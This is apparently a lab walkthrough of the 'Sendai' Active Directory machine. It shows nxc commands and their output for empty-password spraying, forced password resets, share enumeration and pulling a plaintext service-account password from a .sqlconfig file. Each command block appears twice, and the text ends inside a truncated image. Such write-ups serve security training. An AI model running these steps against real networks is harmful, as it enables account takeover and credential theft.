+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc smb sendai.vl -u weak-usernames.txt -p &apos;&apos; --no-bruteforce           
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Sendai]</span>
+&boxur;&boxh;$ nxc smb sendai<span class="hljs-selector-class">.vl</span> -u weak-usernames<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&apos;&apos;</span> <span class="hljs-attr">--no-bruteforce</span>           
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">234.66</span>   <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[*]</span> Windows Server <span class="hljs-number">2022</span> Build <span class="hljs-number">20348</span> x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">234.66</span>   <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[-]</span> sendai.vl\Thomas<span class="hljs-selector-class">.Powell</span>: STATUS_PASSWORD_MUST_CHANGE 
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">234.66</span>   <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[-]</span> sendai.vl\Elliot<span class="hljs-selector-class">.Yates</span>: STATUS_PASSWORD_MUST_CHANGE</code></pre></div>
+<p>Using the <code class="inline-code">change-password</code> module offered by <code class="inline-code">nxc</code>, I change the passwords of both users:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc smb sendai.vl -u thomas.powell -p &apos;&apos;  -M change-password -o NEWPASS=P@ssw0rd   
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [-] sendai.vl\thomas.powell: STATUS_PASSWORD_MUST_CHANGE 
+CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for thomas.powell
+                                                                                                                                                                              
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc smb sendai.vl -u elliot.yates -p &apos;&apos;  -M change-password -o NEWPASS=P@ssw0rd
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [-] sendai.vl\elliot.yates: STATUS_PASSWORD_MUST_CHANGE 
+CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for elliot.yates</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc smb sendai.vl -u thomas.powell -p &apos;&apos;  -M change-password -o NEWPASS=P@ssw0rd   
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [-] sendai.vl\thomas.powell: STATUS_PASSWORD_MUST_CHANGE 
+CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for thomas.powell
+                                                                                                                                                                              
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc smb sendai.vl -u elliot.yates -p &apos;&apos;  -M change-password -o NEWPASS=P@ssw0rd
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [-] sendai.vl\elliot.yates: STATUS_PASSWORD_MUST_CHANGE 
+CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for elliot.yates</code></pre></div>
+<p>Both users have the same privileges over the shares. One more share these users have is <code class="inline-code">config</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc smb sendai.vl -u weak-usernames.txt  -p &apos;P@ssw0rd&apos; --shares
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [+] sendai.vl\Thomas.Powell:P@ssw0rd 
+SMB         10.129.234.66   445    DC               [*] Enumerated shares
+SMB         10.129.234.66   445    DC               Share           Permissions     Remark
+SMB         10.129.234.66   445    DC               -----           -----------     ------
+SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.66   445    DC               C$                              Default share
+SMB         10.129.234.66   445    DC               config          READ,WRITE      
+SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.66   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.234.66   445    DC               sendai          READ,WRITE      company share
+SMB         10.129.234.66   445    DC               SYSVOL          READ            Logon server share 
+SMB         10.129.234.66   445    DC               Users           READ</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc smb sendai.vl -u weak-usernames.txt  -p &apos;P@ssw0rd&apos; --shares
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [+] sendai.vl\Thomas.Powell:P@ssw0rd 
+SMB         10.129.234.66   445    DC               [*] Enumerated shares
+SMB         10.129.234.66   445    DC               Share           Permissions     Remark
+SMB         10.129.234.66   445    DC               -----           -----------     ------
+SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.66   445    DC               C$                              Default share
+SMB         10.129.234.66   445    DC               config          READ,WRITE      
+SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.66   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.234.66   445    DC               sendai          READ,WRITE      company share
+SMB         10.129.234.66   445    DC               SYSVOL          READ            Logon server share 
+SMB         10.129.234.66   445    DC               Users           READ</code></pre></div>
+<p>Inside the <code class="inline-code">config</code> share, there is a file called <code class="inline-code">.sqlconfig</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ smbclient //sendai.vl/config -U sendai.vl/elliot.yates
+Password for [SENDAI.VL\elliot.yates]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Fri Feb  6 11:28:25 2026
+  ..                                DHS        0  Tue Apr 15 22:55:42 2025
+  .sqlconfig                          A       78  Tue Jul 11 08:57:11 2023
+
+        7019007 blocks of size 4096. 1190557 blocks available
+smb: \&gt; get .sqlconfig 
+getting file \.sqlconfig of size 78 as .sqlconfig (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
+smb: \&gt; exit</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>Labs/Sendai]
+&boxur;&boxh;$ smbclient <span class="hljs-regexp">//</span>sendai.vl<span class="hljs-regexp">/config -U sendai.vl/</span>elliot.yates
+Password <span class="hljs-keyword">for</span> [SENDAI.VL\elliot.yates]:
+Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        <span class="hljs-number">0</span>  Fri Feb  <span class="hljs-number">6</span> <span class="hljs-number">11</span>:<span class="hljs-number">28</span>:<span class="hljs-number">25</span> <span class="hljs-number">2026</span>
+  ..                                DHS        <span class="hljs-number">0</span>  Tue Apr <span class="hljs-number">15</span> <span class="hljs-number">22</span>:<span class="hljs-number">55</span>:<span class="hljs-number">42</span> <span class="hljs-number">2025</span>
+  .sqlconfig                          A       <span class="hljs-number">78</span>  Tue Jul <span class="hljs-number">11</span> <span class="hljs-number">08</span>:<span class="hljs-number">57</span>:<span class="hljs-number">11</span> <span class="hljs-number">2023</span>
+
+        <span class="hljs-number">7019007</span> blocks of size <span class="hljs-number">4096</span>. <span class="hljs-number">1190557</span> blocks available
+smb: \&gt; get .sqlconfig 
+getting file \.sqlconfig of size <span class="hljs-number">78</span> as .sqlconfig (<span class="hljs-number">1.6</span> KiloBytes<span class="hljs-regexp">/sec) (average 1.6 KiloBytes/</span>sec)
+smb: \&gt; <span class="hljs-keyword">exit</span></code></pre></div>
+<p>The <code class="inline-code">.sqlconfig</code> contains the credentials of the <code class="inline-code">sqlsvc</code> account:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ cat .sqlconfig 
+Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;                                                                                                                                                                              
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc smb sendai.vl -u sqlsvc -p SurenessBlob85               
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [+] sendai.vl\sqlsvc:SurenessBlob85</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ cat .sqlconfig 
+<span class="hljs-attribute">Server</span>=dc.sendai.vl,1433;Database=prod;User <span class="hljs-attribute">Id</span>=sqlsvc;Password=SurenessBlob85;                                                                                                                                                                              
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc<span class="hljs-built_in"> smb </span>sendai.vl -u sqlsvc -p SurenessBlob85               <span class="hljs-built_in">
+SMB </span>        10.129.234.66   445    DC               [*] Windows<span class="hljs-built_in"> Server </span>2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (<span class="hljs-literal">Null</span> Auth:True)<span class="hljs-built_in">
+SMB </span>        10.129.234.66   445    DC               [+] sendai.vl\sqlsvc:SurenessBlob85</code></pre></div>
+<p>As shown in the output above, the credentials are <code class="inline-code">sqlsvc:SurenessBlob85</code>. Also, the credentials work successfully.</p>
+<p>The user <code class="inline-code">elliot.yates</code> is a member of <code class="inline-code">SUPPORT</code> group. And members of this group have <code class="inline-code">GenericAll</code> privileges over <code class="inline-code">ADMSVC</code> group:<br/>
+<img src="data:image/png;base64,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